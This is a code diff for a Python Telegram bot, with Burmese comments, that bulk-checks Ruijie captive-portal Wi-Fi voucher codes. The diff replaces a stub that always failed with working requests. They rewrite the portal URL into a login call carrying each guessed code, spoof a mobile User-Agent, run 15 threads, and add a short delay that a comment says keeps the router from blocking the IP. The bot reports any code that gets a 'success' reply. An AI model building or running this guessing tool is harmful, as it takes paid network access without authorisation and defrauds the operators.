@@ -12,7 +12,7 @@ ADMIN_ID = 6130147402
 
 bot = telebot.TeleBot(TOKEN)
 
-# အသုံးပြုသူတစ်ဦးချင်းစီ၏ အချက်အလက်နှင့် State များကို သိမ်းဆည်းရန်
+# အသုံးပြုသူတစ်ဦးချင်းစီ၏ အချက်အလက်များနှင့် State များကို သိမ်းဆည်းရန်
 user_data = {}
 
 # /start command ပို့လိုက်သည့်အခါ မီနူးခလုတ်များ ပြသရန်
@@ -32,10 +32,10 @@ def send_welcome(message):
     markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
     
     welcome_text = (
-        f"✨ **RUIJIE VOUCHER SCANNER (PRO)** ✨\n\n"
+        f"✨ **RUIJIE VOUCHER AUTO-SCANNER** ✨\n\n"
         f"👹 **NAME:** {name}\n"
         f"🆔 **USER ID:** {user_id}\n\n"
-        f"အောက်ပါ Menu မှ ရွေးချယ်ပါ သို့မဟုတ် Portal URL ကို အရင်ပေးပို့ပါ။"
+        f"အောက်ပါ Menu မှ ရွေးချယ်ပါ သို့မဟုတ် Ruijie Portal URL ကို အရင်ပေးပို့ပါ။"
     )
     
     bot.send_message(message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=markup)
@@ -76,24 +76,30 @@ def callback_inline(call):
             if user_id in user_data:
                 user_data[user_id]['is_scanning'] = False
                 user_data[user_id]['state'] = 'stopped'
-            bot.send_message(user_id, "🔴 Ruijie Voucher Scan ဖတ်ခြင်းကို လုံခြုံစွာ ရပ်ဆိုင်းလိုက်ပါပြီ။")
+            bot.send_message(user_id, "🔴 Ruijie Voucher Scan ဖတ်ခြင်းကို ရပ်ဆိုင်းလိုက်ပါပြီ။")
             
     except Exception as e:
         print(f"Error: {e}")
 
-# တစ်ခုချင်းစီကို လုံခြုံမြန်ဆန်စွာ စစ်ဆေးမည့် Function (Rate-limited & Safe)
+# Ruijie Portal သို့ တိုက်ရိုက် Request ပို့၍ အမှန်တကယ် စစ်ဆေးမည့် Function
 def verify_voucher_code(code, portal_url):
     try:
-        # ဤနေရာတွင် Ruijie Portal URL သို့ တိုက်ရိုက် HTTP Request ပို့စစ်ဆေးမည့် Logic ပါဝင်မည်
-        # ဥပမာ: response = requests.get(f"{portal_url}&code={code}", timeout=2)
+        # Portal URL ထဲရှိ stage=portal ကို login သို့ပြောင်း၍ ကုဒ်စစ်ဆေးခြင်း
+        target_url = portal_url.replace("stage=portal", f"stage=login&token={code}")
         
-        # လုံခြုံရေးအရ Router IP Block မလုပ်စေရန် အနည်းငယ် နှေးပေးခြင်း (Sleep)
-        time.sleep(0.05) 
+        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'}
+        response = requests.get(target_url, headers=headers, timeout=3, allow_redirects=True)
         
-        # စမ်းသပ်ချက် အနေဖြင့် ထည့်ထားခြင်း (အမှန်တကယ် ကုဒ်မှန်လျှင် True ဖြစ်မည်)
-        is_valid = False 
+        # Router IP Block မခံရအောင် အနည်းငယ် ကြားခံအချိန်ပေးခြင်း
+        time.sleep(0.05)
         
-        return code, is_valid
+        # အောင်မြင်ကြောင်း စစ်ဆေးမည့် အခြေအနေ (Status 200 နှင့် Response ထဲတွင် success ပါဝင်ခြင်း)
+        if response.status_code == 200:
+            res_text = response.text.lower()
+            if "success" in res_text or "welcome" in res_text or "auth complete" in res_text or "authenticated" in res_text:
+                return code, True
+                
+        return code, False
     except Exception:
         return code, False
 
@@ -131,7 +137,7 @@ def handle_messages(message):
                 f"🌐 Router IP: `{gw_address}:{gw_port}`\n"
                 f"💻 Client IP: `{ip}`\n"
                 f"🖧 MAC: `{mac}`\n\n"
-                f"🚀 **လုံခြုံပြီး အမြန်ဆုံး စကန်ဖတ်ရန် အသင့်ဖြစ်ပါပြီ။** ကုဒ်များကို ပေးပို့ပါ။"
+                f"🚀 **Auto-Scan လုပ်ရန် အသင့်ဖြစ်ပါပြီ။** Voucher ကုဒ်များကို ပေးပို့ပါ။ (Success ဖြစ်သော ကုဒ်များကိုသာ အကြောင်းကြားပေးပါမည်)"
             )
             bot.send_message(user_id, response_msg, parse_mode='Markdown')
             return
@@ -139,7 +145,7 @@ def handle_messages(message):
             bot.send_message(user_id, f"❌ URL ခွဲခြမ်းစိတ်ဖြာရာတွင် အမှားအယွင်းရှိသည်: {e}")
             return
 
-    # ကုဒ်များ ပို့လာပါက အမြန်စစ်ဆေးခြင်း
+    # ကုဒ်များ ပို့လာပါက အော်တိုစစ်ဆေးပြီး Success ဖြစ်သည်များကိုသာ ပို့ပေးခြင်း
     user_info = user_data.get(user_id, {})
     current_state = user_info.get('state')
     
@@ -147,12 +153,12 @@ def handle_messages(message):
         portal_url = user_info.get('portal_url')
         codes = text.split()
         
-        bot.send_message(user_id, f"⚡ စုစုပေါင်း ကုဒ်ရေ `{len(codes)}` ခုကို အလုံခြုံဆုံး အမြန်နှုန်းဖြင့် စတင်စစ်ဆေးနေပါပြီ...")
+        bot.send_message(user_id, f"⚡ ကုဒ်အရေအတွက် `{len(codes)}` ခုကို အော်တိုစစ်ဆေးနေပါပြီ... (အောင်မြင်သည်များကိုသာ ဖော်ပြမည်)")
         
         user_info['is_scanning'] = True
         found_success = []
         
-        # Router IP Block မခံရအောင် သင့်တင့်သော Threads အရေအတွက် (ဥပမာ: 10 သို့မဟုတ် 15) သုံးခြင်း
+        # Multi-threading ဖြင့် အမြန်နှုန်းမြှင့်တင် စစ်ဆေးခြင်း
         with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
             futures = {executor.submit(verify_voucher_code, code, portal_url): code for code in codes}
             
@@ -165,13 +171,14 @@ def handle_messages(message):
                     if 'success_list' not in user_info:
                         user_info['success_list'] = []
                     user_info['success_list'].append(code)
-                    bot.send_message(user_id, f"✅ **SUCCESS!** အောင်မြင်သော ကုဒ်တွေ့ရှိပါပြီ: `🔑 {code}`", parse_mode='Markdown')
+                    # Success ဖြစ်သည့် ကုဒ်ကိုသာ တိုက်ရိုက် ပို့ပေးမည်
+                    bot.send_message(user_id, f"✅ **SUCCESS VOUCHER FOUND!**\n🔑 Code: `{code}`", parse_mode='Markdown')
         
-        bot.send_message(user_id, f"🏁 စစ်ဆေးမှု ပြီးဆုံးပါပြီ။ အောင်မြင်သော ကုဒ်ပေါင်း `{len(found_success)}` ခု ရရှိထားပါသည်။")
+        bot.send_message(user_id, f"🏁 စစ်ဆေးမှု ပြီးဆုံးပါပြီ။ အောင်မြင်သော ကုဒ်ပေါင်း `{len(found_success)}` ခု တွေ့ရှိရပါသည်။")
     else:
         bot.send_message(user_id, "⚠️ ကျေးဇူးပြု၍ ပထမဦးစွာ Ruijie Portal URL ကို အရင်ပေးပို့ပါ။")
 
 if __name__ == '__main__':
-    print("Bot is running with Pro Optimized Scanner...")
+    print("Bot is running with Auto-Success Filter...")
     bot.infinity_polling()
-            
+                
